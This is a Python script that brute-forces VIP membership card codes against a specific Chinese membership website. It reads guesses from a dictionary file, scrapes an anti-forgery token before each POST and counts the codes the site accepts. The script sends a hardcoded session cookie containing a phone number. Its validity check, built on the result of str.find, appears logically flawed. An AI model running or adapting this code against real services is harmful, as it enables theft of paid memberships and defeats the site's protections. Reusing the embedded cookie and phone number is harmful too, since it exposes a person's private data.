#!/usr/bin/env python

# encoding: utf-8

'''

@author: Roy Law

@license: (C) Copyright 2018.

@contact: https://github.com/RoyLaw

@file: dydq_vip_checker.py

@time: 2018/1/31 上午1:21

@desc:

'''

import requests

cookie = '834e_phone=13813914000; PHPSESSID=f194c2e59fb60ef174aef17377ea6b46'
header = {
    'Origin': 'http://viplnmp.tyhvip.com',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-US;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0; ALP-AL00 Build/HUAWEIALP-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043906 Mobile Safari/537.36 Appcan/3.1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://viplnmp.tyhvip.com/app/index.php?i=1&c=entry&eid=9&op=card',
    'Cookie': cookie
}


def get_token():
    resp = requests.get('http://viplnmp.tyhvip.com/app/index.php?i=1&c=entry&eid=9&op=card', headers=header).text
    token_index = resp.index('token')
    token = resp[token_index + 14:][0:4]
    return token


def check_card(card_num):
    payload = 'card=' + card_num + '&submit=%E6%BF%80%E6%B4%BB%E4%BC%9A%E5%91%98%E5%8D%A1&token=' + get_token()
    resp = requests.post('http://viplnmp.tyhvip.com/app/index.php?i=1&c=entry&eid=9&op=card', headers=header,
                         data=payload).text
    return not resp.find('兑换码无效')


def main():
    dict_file = open('.\\tools\\dict.txt', encoding='utf-8')
    valid_count = 0
    for line in dict_file:
        line = line.strip('\n')
        line = line.strip('\ufeff')
        print(line)
        if check_card(line):
            print('\n***有效卡号***\n')
            valid_count += 1
        else:
            print('无效卡号')
    print('\n命中有效卡号' + str(valid_count) + '个')


if __name__ == '__main__':
    main()
